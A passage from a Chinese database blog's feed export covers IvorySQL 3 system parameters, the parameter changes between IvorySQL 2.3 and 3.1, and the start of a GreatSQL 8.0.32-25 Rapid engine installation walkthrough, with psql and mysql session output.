<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">[ivorysql<span class="variable">@shawnyan</span> <span class="operator">~</span>]$ psql <span class="operator">-</span>x</span><br><span class="line">psql (<span class="number">16.1</span><span class="operator">-</span>ShawnYan)</span><br><span class="line">Type &quot;help&quot; <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> ivorysql.compatible_mode;</span><br><span class="line"><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="comment">------------+---</span></span><br><span class="line">ivorysql.compatible_mode <span class="operator">|</span> pg</span><br></pre></td></tr></table></figure></div>
<p>连接到兼容 oracle 的端口 1521，显示为 oracle 模式。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">[ivorysql<span class="variable">@shawnyan</span> bin]$ psql <span class="operator">-</span>p1521 <span class="operator">-</span>x</span><br><span class="line">psql (<span class="number">16.1</span><span class="operator">-</span>ShawnYan)</span><br><span class="line">Type &quot;help&quot; <span class="keyword">for</span> help.</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> ivorysql.compatible_mode;</span><br><span class="line"><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="comment">------------+-------</span></span><br><span class="line">ivorysql.compatible_mode <span class="operator">|</span> oracle</span><br></pre></td></tr></table></figure></div>
<h3 id="18-ivorysql-database-mode">18. ivorysql.database_mode</h3>
<p><code>ivorysql.database_mode</code> 表示当前数据库的模式（pg/oracle）。</p>
<h3 id="19-ivorysql-datetime-ignore-nls-mask">19. ivorysql.datetime_ignore_nls_mask</h3>
<p>表示日期格式是否会受 NLS 参数影响，默认为 0。</p>
<!--
ivorysql=# show nls_date_format;
-[ RECORD 1 ]---+-----------
nls_date_format | YYYY-MM-DD

ivorysql=# select sys.current_date();
-[ RECORD 1 ]+-----------
current_date | 2024-02-07

ivorysql=# show ivorysql.datetime_ignore_nls_mask;
-[ RECORD 1 ]---------------------+--
ivorysql.datetime_ignore_nls_mask | 0

ivorysql=# set nls_date_format = 'YY/MM/DD';
SET
ivorysql=# select sys.current_date();
-[ RECORD 1 ]+---------
current_date | 24/02/07

ivorysql=# set ivorysql.datetime_ignore_nls_mask = 1;
SET
ivorysql=# select sys.current_date();
-[ RECORD 1 ]+---------
current_date | 24/02/07

ivorysql=#
ivorysql=# select sys.current_date();
-[ RECORD 1 ]+---------
current_date | 24/02/07
-->
<h3 id="20-ivorysql-enable-emptystring-to-NULL">20. ivorysql.enable_emptystring_to_NULL</h3>
<p>取值为（on/off），该变量为 on 时，会将插入的空字符串转成 NULL 值存储。</p>
<p>示例：</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> name,setting <span class="keyword">from</span> pg_settings <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;ivory%&#x27;</span>;</span><br><span class="line">                name                 <span class="operator">|</span>   setting</span><br><span class="line"><span class="comment">-------------------------------------+-------------</span></span><br><span class="line"> ivorysql.compatible_mode            <span class="operator">|</span> oracle</span><br><span class="line"> ivorysql.database_mode              <span class="operator">|</span> oracle</span><br><span class="line"> ivorysql.datetime_ignore_nls_mask   <span class="operator">|</span> <span class="number">0</span></span><br><span class="line"> ivorysql.enable_emptystring_to_NULL <span class="operator">|</span> <span class="keyword">on</span></span><br><span class="line"> ivorysql.identifier_case_switch     <span class="operator">|</span> interchange</span><br><span class="line"> ivorysql.listen_addresses           <span class="operator">|</span> localhost</span><br><span class="line"> ivorysql.port                       <span class="operator">|</span> <span class="number">1521</span></span><br><span class="line">(<span class="number">7</span> <span class="keyword">rows</span>)</span><br><span class="line">...</span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">create</span> <span class="keyword">table</span> tnull (id <span class="type">int</span>, sal <span class="type">varchar</span>(<span class="number">20</span>));</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">insert</span> <span class="keyword">into</span> tnull <span class="keyword">select</span> <span class="number">1</span>,<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tnull <span class="keyword">where</span> sal <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"> id <span class="operator">|</span> sal</span><br><span class="line"><span class="comment">----+-----</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">set</span> ivorysql.enable_emptystring_to_NULL <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">SET</span></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tnull <span class="keyword">where</span> sal <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"> id <span class="operator">|</span> sal</span><br><span class="line"><span class="comment">----+-----</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">insert</span> <span class="keyword">into</span> tnull <span class="keyword">select</span> <span class="number">3</span>,<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="number">0</span> <span class="number">1</span></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tnull <span class="keyword">where</span> sal <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"> id <span class="operator">|</span> sal</span><br><span class="line"><span class="comment">----+-----</span></span><br><span class="line">  <span class="number">1</span> <span class="operator">|</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br><span class="line"></span><br><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tnull <span class="keyword">where</span> sal <span class="operator">=</span> <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> id <span class="operator">|</span> sal</span><br><span class="line"><span class="comment">----+-----</span></span><br><span class="line">  <span class="number">3</span> <span class="operator">|</span></span><br><span class="line">(<span class="number">1</span> <span class="type">row</span>)</span><br></pre></td></tr></table></figure></div>
<h3 id="21-ivorysql-identifier-case-switch">21. ivorysql.identifier_case_switch</h3>
<p>用于设置字符大小写转换模式。</p>
<p>可设置为 <code>NORMAL</code>，<code>LOWERCASE</code>，<code>INTERCHANGE</code>。</p>
<h3 id="22-ivorysql-listen-addresses">22. ivorysql.listen_addresses</h3>
<p>表示兼容模式监听的地址。</p>
<p>默认监听本地，可以设置为 <code>*</code>，允许所有地址访问。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> ivorysql.listen_addresses;</span><br><span class="line"><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="comment">-------------+--</span></span><br><span class="line">ivorysql.listen_addresses <span class="operator">|</span> <span class="operator">*</span></span><br></pre></td></tr></table></figure></div>
<h3 id="23-ivorysql-port">23. ivorysql.port</h3>
<p>表示兼容模式下连接的端口号，这里默认为兼容 oracle 模式，端口号为 1521。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">ivorysql<span class="operator">=</span># <span class="keyword">show</span> ivorysql.port;</span><br><span class="line"><span class="operator">-</span>[ RECORD <span class="number">1</span> ]<span class="operator">-</span><span class="operator">+</span><span class="comment">-----</span></span><br><span class="line">ivorysql.port <span class="operator">|</span> <span class="number">1521</span></span><br></pre></td></tr></table></figure></div>
<h2 id="总结">总结</h2>
<p>IvorySQL 3 的新增参数提供了更多的配置和调优选项。通过了解这些参数，我们可以适当调整安全策略，更好的完成去 O 和国产化替代任务。在未来的工作中，建议持续关注 IvorySQL 的更新和优化，以便更好地利用这些新功能。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>IvorySQL</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>ivorysql</tag>
        <tag>highgo</tag>
        <tag>postgresql 16</tag>
      </tags>
  </entry>
  <entry>
    <title>IvorySQL 3.1 和 2.3 系统参数变化（上篇）</title>
    <url>/2024/postgresql/ivorysql-3.1-sys-vars-1/</url>
    <content><![CDATA[<img  alt="ivorysql.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240207-d856ff9f-5e9e-474b-b5c0-0ff3718eb5c8.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="前情回顾">前情回顾</h2>
<p>IvorySQL 3.1 已经发版一段时间，前面写过几篇文章来介绍 IvorySQL。</p>
<ul>
<li><a class="link"   href="https://mp.weixin.qq.com/s/jZ0RcLg-muJ9_yiKq591Dw" >好消息！IvorySQL 库回归啦~ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li>
<li><a href="https://shawnyan.cn/2023/postgresql/ivorysql-v3.0-feature/">IvorySQL v3.0 新特性浅测</a></li>
<li><a href="https://shawnyan.cn/2023/postgresql/ivorysql-v2.3-feature/">象牙数据库 IvorySQL v2.3 特性浅析</a></li>
</ul>
<p>从 IvorySQL 3.0 到 3.1 变化较小，没有系统参数变化，主要修复了各种八阿哥。<br>
接下来将用两篇文章的篇幅介绍 IvorySQL 3.1 和 2.3 的参数区别。</p>
<h2 id="系统参数变化（count）">系统参数变化（count）</h2>
<p>视图 <code>pg_settings</code> 提供对服务器运行时参数的访问。 它本质上是 <code>SHOW</code> 和 <code>SET</code> 命令的替代接口。它还提供对有关每个参数的一些事实的访问，这些事实不能从 <code>SHOW</code> 直接获得，例如最小值和最大值。</p>
<p>从 pg_settings 可以查询到当前版本数据库有多少个系统参数，以及设定值和默认值。</p>
<p>IvorySQL 2.3 共有 354 个参数，IvorySQL 3.1 共有 371 个参数。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">-- <span class="number">2.3</span></span><br><span class="line">ivorysql=<span class="meta"># select setting from pg_settings where name = <span class="string">&#x27;server_version&#x27;</span>;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]----------</span><br><span class="line">setting | <span class="number">15.3</span>-ShawnYan</span><br><span class="line"></span><br><span class="line">ivorysql=<span class="meta"># select count(*) from pg_settings;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]</span><br><span class="line">count | <span class="number">354</span></span><br><span class="line"></span><br><span class="line">-- <span class="number">3.1</span></span><br><span class="line">ivorysql=<span class="meta"># select setting from pg_settings where name = <span class="string">&#x27;server_version&#x27;</span>;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]----------</span><br><span class="line">setting | <span class="number">16.1</span>-ShawnYan</span><br><span class="line"></span><br><span class="line">ivorysql=<span class="meta"># select count(*) from pg_settings;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]</span><br><span class="line">count | <span class="number">371</span></span><br></pre></td></tr></table></figure></div>
<p>其中，有 6 个删减参数，2 个默认值变更参数，以及 23 个新增参数。</p>
<h2 id="系统参数变化（remove）">系统参数变化（remove）</h2>
<h3 id="1-compatible-mode">1. compatible_mode</h3>
<p>在之前的文章《象牙数据库 IvorySQL v2.3 特性浅析》中介绍过这个参数。</p>
<blockquote>
<p>IvorySQL 中增加了配置项 <code>compatible_mode</code> 用于选择兼容 PostgreSQL 模式还是 Oracle 模式，默认值为 <code>postgres</code></p>
</blockquote>
<p>在 IvorySQL 3 中，该参数被 <code>ivorysql.compatible_mode</code> 取代。</p>
<h3 id="2-force-parallel-mode">2. force_parallel_mode</h3>
<p>该参数用于强制开启并行查询，一般用于测试。从 IvorySQL 3 开始，更名为 <code>debug_parallel_query</code>。</p>
<h3 id="3-lc-collate">3. lc_collate</h3>
<p>从 IvorySQL 3 开始，只读参数 <code>lc_collate</code> 和 <code>lc_ctype</code> 被移除。</p>
<p>数据库之间的排序规则和区域设置可能有所不同，因此将它们作为只读服务器变量是没有帮助的。</p>
<p>除此之外，还在使用的 lc 参数还有： lc_messages, lc_monetary, lc_numeric, lc_time.</p>
<h3 id="4-lc-ctype">4. lc_ctype</h3>
<p>同上。</p>
<h3 id="5-promote-trigger-file">5. promote_trigger_file</h3>
<p>该参数意为指定触发器文件名称，该文件的存在将结束 standby 节点中的恢复。</p>
<p>用于将备用数据库升级为主数据库，现在使用 <code>pg_ctl promote</code> 或 <code>pg_promote()</code> 可以更轻松地完成。</p>
<p>该参数在 PG 12 中，名称由 <code>trigger_file</code> 变更为 <code>promote_trigger_file</code>，在 IvorySQL 3 中被移除。</p>
<h3 id="6-vacuum-defer-cleanup-age">6. vacuum_defer_cleanup_age</h3>
<p>该参数用于指定 VACUUM 和 HOT 更新在清除死亡行版本之前，应该推迟多久（以事务数量计）。默认为 0 个事务，死亡行版本将被尽可能快地清除。</p>
<p>可以在 standby 服务器上设定 <code>hot_standby_feedback</code> 和复制槽，该参数不再需要，在 IvorySQL 3 中被移除。</p>
<h2 id="系统参数变化（modify）">系统参数变化（modify）</h2>
<p>有两个参数的默认值发生了变化。</p>
<h3 id="1-nls-length-semantics">1. nls_length_semantics</h3>
<p><code>nls_length_semantics</code> 参数用于设定字符串长度单位，</p>
<p>在 IvorySQL 2.3 中，默认值为 <code>none</code>，在 IvorySQL 3.1 中，默认值变更为 <code>byte</code>。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">-- <span class="number">2.3</span></span><br><span class="line">ivorysql=<span class="meta"># select setting from pg_settings where name = <span class="string">&#x27;server_version&#x27;</span>;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]----------</span><br><span class="line">setting | <span class="number">15.3</span>-ShawnYan</span><br><span class="line"></span><br><span class="line">ivorysql=<span class="meta"># select setting, source from pg_settings where name = <span class="string">&#x27;nls_length_semantics&#x27;</span>;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]----</span><br><span class="line">setting | none</span><br><span class="line">source  | <span class="keyword">default</span></span><br><span class="line"></span><br><span class="line">-- <span class="number">3.1</span></span><br><span class="line">ivorysql=<span class="meta"># select setting from pg_settings where name = <span class="string">&#x27;server_version&#x27;</span>;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]----------</span><br><span class="line">setting | <span class="number">16.1</span>-ShawnYan</span><br><span class="line"></span><br><span class="line">ivorysql=<span class="meta"># select setting, source from pg_settings where name = <span class="string">&#x27;nls_length_semantics&#x27;</span>;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]----</span><br><span class="line">setting | byte</span><br><span class="line">source  | <span class="keyword">default</span></span><br></pre></td></tr></table></figure></div>
<h3 id="2-shared-preload-libraries">2. shared_preload_libraries</h3>
<p>IvorySQL 3 中，对 Oracle 兼容模式的实现进行了重构，所以系统参数也发生了调整，该参数受此影响。</p>
<p>在 2.3 中为空，在 3.1 中有 ora 相关设定。</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">-- <span class="number">2.3</span></span><br><span class="line">ivorysql=<span class="meta"># select setting, source from pg_settings where name = <span class="string">&#x27;shared_preload_libraries&#x27;</span>;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]----</span><br><span class="line">setting |</span><br><span class="line">source  | <span class="keyword">default</span></span><br><span class="line"></span><br><span class="line">-- <span class="number">3.1</span></span><br><span class="line">ivorysql=<span class="meta"># select setting, source from pg_settings where name = <span class="string">&#x27;shared_preload_libraries&#x27;</span>;</span></span><br><span class="line">-[ RECORD <span class="number">1</span> ]---------------------------</span><br><span class="line">setting | liboracle_parser, ivorysql_ora</span><br><span class="line">source  | configuration file</span><br></pre></td></tr></table></figure></div>
<h2 id="小结">小结</h2>
<p>在对比 IvorySQL 3.1 和 2.3 的系统参数时，共发现 31 个变化点，本文介绍了 6 个删减参数，和 2 个默认值变更参数。</p>
<p>关于 23 个新增参数，且听下回分解。</p>
<img  alt="logo.jpg" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240222-e133c9a2-37fa-47e9-9f67-d49bfdc02bdf.jpg"
                      referrerpolicy="no-referrer"
                >
]]></content>
      <categories>
        <category>IvorySQL</category>
      </categories>
      <tags>
        <tag>postgresql</tag>
        <tag>ivorysql</tag>
        <tag>highgo</tag>
        <tag>postgresql 16</tag>
      </tags>
  </entry>
  <entry>
    <title>抢鲜体验 GreatSQL 的 AP 引擎 Rapid</title>
    <url>/2024/mysql/greatsql-ap-rapid/</url>
    <content><![CDATA[<img  alt="greatsql.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20240205-b04a5749-440d-4d5b-a8cd-4700116b24d7.png"
                      referrerpolicy="no-referrer"
                >
<h2 id="GreatSQL-及-Rapid-存储引擎简介">GreatSQL 及 Rapid 存储引擎简介</h2>
<p>GreatSQL 数据库是一款开源免费数据库，可在普通硬件上满足金融级应用场景，具有高可用、高性能、高兼容、高安全等特性，可作为 MySQL 或 Percona Server for MySQL 的理想可选替换。</p>
<p>从 GreatSQL 8.0.32-25 版本开始，新增 Rapid 存储引擎，该引擎使得 GreatSQL 能满足联机分析（OLAP）查询请求。Rapid 引擎不会直接面对客户端和应用程序，用户无需修改原有的数据访问方式。它是一个无共享、内存化、混合列式存储的查询处理引擎，其设计目的是为了高性能的处理分析型查询。</p>
<h2 id="GreatSQL-安装">GreatSQL 安装</h2>
<p>以下内容为 GreatSQL 在 CentOS 7 的安装步骤。</p>
<h3 id="1-下载-GreatSQL-8-0-32-25-安装包">1. 下载 GreatSQL 8.0.32-25 安装包</h3>
<p>这里下载的是适配 el7 的 RPM 包。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">wget https://product.greatdb.com/GreatSQL-8.0.32-25-Rapid/greatsql-8.0.32-25.1.el7.x86_64.rpm-bundle.tar.xz</span><br></pre></td></tr></table></figure></div>
<h3 id="2-解压压缩包">2. 解压压缩包</h3>
<p>解压后得到 6 个 RPM 包，这里没有 test 包，如需使用，需要另行下载。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# tar xf greatsql-8.0.32-25.1.el7.x86_64.rpm-bundle.tar.xz</span><br><span class="line">[root@shawnyan ~]# ls -alh greatsql-*</span><br><span class="line">-rw-r--r-- 1 root root 121M Feb  4 03:02 greatsql-8.0.32-25.1.el7.x86_64.rpm-bundle.tar.xz</span><br><span class="line">-rw-r--r-- 1 root root  19M Feb  2 15:51 greatsql-client-8.0.32-25.1.el7.x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root 1.9M Feb  2 15:51 greatsql-devel-8.0.32-25.1.el7.x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root 2.1M Feb  2 15:51 greatsql-icu-data-files-8.0.32-25.1.el7.x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root 5.0M Feb  2 15:51 greatsql-mysql-router-8.0.32-25.1.el7.x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root  93M Feb  2 15:51 greatsql-server-8.0.32-25.1.el7.x86_64.rpm</span><br><span class="line">-rw-r--r-- 1 root root 1.5M Feb  2 15:51 greatsql-shared-8.0.32-25.1.el7.x86_64.rpm</span><br><span class="line">[root@shawnyan ~]#</span><br></pre></td></tr></table></figure></div>
<h3 id="3-安装-RPM-包">3. 安装 RPM 包</h3>
<p>使用 YUM 命令直接安装即可，YUM 会自行分析依赖。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# yum install greatsql-*.rpm</span><br><span class="line">...</span><br><span class="line">Install  6 Packages (+46 Dependent packages)</span><br><span class="line">Upgrade             (  3 Dependent packages)</span><br><span class="line"></span><br><span class="line">Total size: 624 M</span><br><span class="line">Total download size: 19 M</span><br><span class="line">Is this ok [y/d/N]: y</span><br><span class="line">...</span><br><span class="line">Installed:</span><br><span class="line">  greatsql-client.x86_64 0:8.0.32-25.1.el7  greatsql-devel.x86_64 0:8.0.32-25.1.el7  greatsql-icu-data-files.x86_64 0:8.0.32-25.1.el7  greatsql-mysql-router.x86_64 0:8.0.32-25.1.el7  greatsql-server.x86_64 0:8.0.32-25.1.el7  greatsql-shared.x86_64 0:8.0.32-25.1.el7</span><br><span class="line"></span><br><span class="line">Dependency Installed:</span><br><span class="line">  groff-base.x86_64 0:1.22.2-8.el7         keyutils-libs-devel.x86_64 0:1.5.8-3.el7    krb5-devel.x86_64 0:1.15.1-55.el7_9             libaio.x86_64 0:0.3.109-13.el7         libcom_err-devel.x86_64 0:1.42.9-19.el7        libkadm5.x86_64 0:1.15.1-55.el7_9</span><br><span class="line">  libselinux-devel.x86_64 0:2.5-15.el7     libsepol-devel.x86_64 0:2.5-10.el7          libverto-devel.x86_64 0:0.2.5-4.el7             make.x86_64 1:3.82-24.el7              net-tools.x86_64 0:2.0-0.25.20131004git.el7    numactl-libs.x86_64 0:2.0.12-5.el7</span><br><span class="line">  openssl.x86_64 1:1.0.2k-26.el7_9         openssl-devel.x86_64 1:1.0.2k-26.el7_9      pcre-devel.x86_64 0:8.32-17.el7                 perl.x86_64 4:5.16.3-299.el7_9         perl-Carp.noarch 0:1.26-244.el7                perl-Data-Dumper.x86_64 0:2.145-3.el7</span><br><span class="line">  perl-Digest.noarch 0:1.17-245.el7        perl-Digest-MD5.x86_64 0:2.52-3.el7         perl-Encode.x86_64 0:2.51-7.el7                 perl-Exporter.noarch 0:5.68-3.el7      perl-File-Path.noarch 0:2.09-2.el7             perl-File-Temp.noarch 0:0.23.01-3.el7</span><br><span class="line">  perl-Filter.x86_64 0:1.49-3.el7          perl-Getopt-Long.noarch 0:2.40-3.el7        perl-HTTP-Tiny.noarch 0:0.033-3.el7             perl-PathTools.x86_64 0:3.40-5.el7     perl-Pod-Escapes.noarch 1:1.04-299.el7_9       perl-Pod-Perldoc.noarch 0:3.20-4.el7</span><br><span class="line">  perl-Pod-Simple.noarch 1:3.28-4.el7      perl-Pod-Usage.noarch 0:1.63-3.el7          perl-Scalar-List-Utils.x86_64 0:1.27-248.el7    perl-Socket.x86_64 0:2.010-5.el7       perl-Storable.x86_64 0:2.45-3.el7              perl-Text-ParseWords.noarch 0:3.29-4.el7</span><br><span class="line">  perl-Time-HiRes.x86_64 4:1.9725-3.el7    perl-Time-Local.noarch 0:1.2300-2.el7       perl-constant.noarch 0:1.27-2.el7               perl-libs.x86_64 4:5.16.3-299.el7_9    perl-macros.x86_64 4:5.16.3-299.el7_9          perl-parent.noarch 1:0.225-244.el7</span><br><span class="line">  perl-podlators.noarch 0:2.5.1-3.el7      perl-threads.x86_64 0:1.87-4.el7            perl-threads-shared.x86_64 0:1.43-6.el7         zlib-devel.x86_64 0:1.2.7-21.el7_9</span><br><span class="line"></span><br><span class="line">Dependency Updated:</span><br><span class="line">  krb5-libs.x86_64 0:1.15.1-55.el7_9                                                       openssl-libs.x86_64 1:1.0.2k-26.el7_9                                                       zlib.x86_64 0:1.2.7-21.el7_9</span><br><span class="line"></span><br><span class="line">Complete!</span><br></pre></td></tr></table></figure></div>
<h3 id="4-启动-GreatSQL-数据库">4. 启动 GreatSQL 数据库</h3>
<p>安装时会自行创建 <code>mysql</code> 用户，安装完成后，初始化数据目录。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">id mysql</span><br><span class="line">/usr/bin/mysqld_pre_systemd --user=mysql</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# id mysql</span><br><span class="line">uid=27(mysql) gid=27(mysql) groups=27(mysql)</span><br></pre></td></tr></table></figure></div>
<p>使用 <code>mysqld_safe</code> 启动数据库。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">/usr/bin/mysqld_safe &amp;</span><br></pre></td></tr></table></figure></div>
<h3 id="5-连接-GreatSQL-数据库">5. 连接 GreatSQL 数据库</h3>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure></div>
<p>查看状态和版本信息。</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@shawnyan ~]# mysql -uroot -p&#x27;Greatsql@123&#x27;</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 15</span><br><span class="line">Server version: 8.0.32-25 GreatSQL (GPL), Release 25, Revision 79f57097e3f</span><br><span class="line"></span><br><span class="line">Copyright (c) 2021-2023 GreatDB Software Co., Ltd</span><br><span class="line">Copyright (c) 2009-2023 Percona LLC and/or its affiliates</span><br><span class="line">Copyright (c) 2000, 2023, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">\s</span></span><br><span class="line">--------------</span><br><span class="line">mysql  Ver 8.0.32-25 for Linux on x86_64 (GreatSQL (GPL), Release 25, Revision 79f57097e3f)</span><br><span class="line"></span><br><span class="line">Connection id:          15</span><br><span class="line">Current database:</span><br><span class="line">Current user:           root@localhost</span><br><span class="line">SSL:                    Not in use</span><br><span class="line">Current pager:          stdout</span><br><span class="line">Using outfile:          &#x27;&#x27;</span><br><span class="line">Using delimiter:        ;</span><br><span class="line">Server version:         8.0.32-25 GreatSQL (GPL), Release 25, Revision 79f57097e3f</span><br><span class="line">Protocol version:       10</span><br><span class="line">Connection:             Localhost via UNIX socket</span><br><span class="line">Server characterset:    utf8mb4</span><br><span class="line">Db     characterset:    utf8mb4</span><br><span class="line">Client characterset:    latin1</span><br><span class="line">Conn.  characterset:    latin1</span><br><span class="line">UNIX socket:            /var/lib/mysql/mysql.sock</span><br><span class="line">Binary data as:         Hexadecimal</span><br><span class="line">Uptime:                 55 min 51 sec</span><br><span class="line"></span><br><span class="line">Threads: 2  Questions: 462  Slow queries: 0  Opens: 366  Flush tables: 3  Open tables: 279  Queries per second avg: 0.137</span><br><span class="line">--------------</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash"><span class="keyword">select</span> version();</span></span><br><span class="line">+-----------+</span><br><span class="line">| version() |</span><br><span class="line">+-----------+</span><br><span class="line">| 8.0.32-25 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="6-查看第二引擎系统变量">6. 查看第二引擎系统变量</h3>
<p>这个版本的数据库提供了 9 个第二引擎的系统变量。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%secondary%&#x27;;</span><br><span class="line">+--------------------------------------------+----------------------+</span><br><span class="line">| Variable_name                              | Value                |</span><br><span class="line">+--------------------------------------------+----------------------+</span><br><span class="line">| secondary_engine_cost_threshold            | 100000.000000        |</span><br><span class="line">| secondary_engine_parallel_load_workers     | 4                    |</span><br><span class="line">| secondary_engine_read_delay_gtid_threshold | 100                  |</span><br><span class="line">| secondary_engine_read_delay_level          | TABLE_START_INC_TASK |</span><br><span class="line">| secondary_engine_read_delay_time_threshold | 60                   |</span><br><span class="line">| secondary_engine_read_delay_wait_mode      | WAIT_FOR_TRX         |</span><br><span class="line">| secondary_engine_read_delay_wait_timeout   | 60                   |</span><br><span class="line">| show_create_table_skip_secondary_engine    | OFF                  |</span><br><span class="line">| use_secondary_engine                       | OFF                  |</span><br><span class="line">+--------------------------------------------+----------------------+</span><br><span class="line">9 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<h3 id="7-安装-Rapid-存储引擎">7. 安装 Rapid 存储引擎</h3>
<p>查看 Rapid 相关系统变量，由于尚未安装插件，所以查询结果为空。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; show variables like &#x27;%rapid%&#x27;;</span><br><span class="line">Empty set (0.00 sec)</span><br></pre></td></tr></table></figure></div>
<p>安装 Rapid 存储引擎插件。</p>
